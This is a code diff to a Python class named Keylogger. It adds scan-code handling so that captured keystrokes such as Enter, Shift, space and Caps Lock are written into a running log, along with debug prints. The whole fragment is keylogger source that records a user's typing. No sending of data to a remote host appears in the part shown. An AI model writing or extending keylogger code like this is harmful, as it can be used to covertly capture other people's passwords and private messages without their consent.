@@ -17,11 +17,30 @@ class Keylogger:
             to point to. The event callback has three attributes which are: name, scan_code
             (the ascii dec number for the char), time (timestamp)
         '''
+        # fixing special characters 
         
+        char_name = event.name
+        print(event.scan_code)
         
+            
+        if event.scan_code ==  28:
+            char_name = '\n'
+
+        elif event.scan_code ==  42:
+            char_name = '[SHIFT]'
+
+        elif event.scan_code == 53:
+            char_name = '/'
+
+        elif event.scan_code == 57:
+            char_name = ' '
+
+        elif event.scan_code == 58:
+            char_name = '[CAPS LOCK]'
         
-        
-        self.log += event.name
+
+        print(f"the char is: {char_name} and the code is: {event.scan_code}\n")
+        self.log += char_name
 
 
 
